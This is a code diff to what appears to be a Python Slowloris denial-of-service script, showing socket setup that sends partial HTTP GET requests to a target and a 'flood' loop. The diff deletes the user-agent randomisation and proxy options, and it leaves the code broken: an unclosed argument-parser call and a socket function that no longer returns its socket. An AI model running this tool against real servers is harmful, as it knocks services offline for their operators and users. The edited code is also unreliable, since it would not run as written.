@@ -46,28 +46,7 @@ parser.add_argument(
     default=150,
     help="Number of sockets to use in the test",
     type=int,
-)
-parser.add_argument(
-    "-v",
-    "--verbose",
-    dest="verbose",
-    action="store_true",
-    help="Increases logging",
-)
-parser.add_argument(
-    "-ua",
-    "--randuseragents",
-    dest="randuseragent",
-    action="store_true",
-    help="Randomizes user-agents with each request",
-)
-parser.add_argument(
-    "-x",
-    "--useproxy",
-    dest="useproxy",
-    action="store_true",
-    help="Use a SOCKS5 proxy for connecting",
-)
+
 parser.add_argument(
     "--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host"
 )
@@ -186,15 +165,6 @@ def init_socket(ip: str):
     s.connect((ip, args.port))
 
     s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
-
-    ua = user_agents[0]
-    if args.randuseragent:
-        ua = random.choice(user_agents)
-
-    s.send_header("User-Agent", ua)
-    s.send_header("Accept-language", "en-US,en,q=0.5")
-    return s
-
 
 def slowloris_iteration():
     logging.info("[✴️]  \033[93mTime to flood   \033[31m[\033[34mThe server\033[31m]  \033[32m" +url+ "\033[0m")
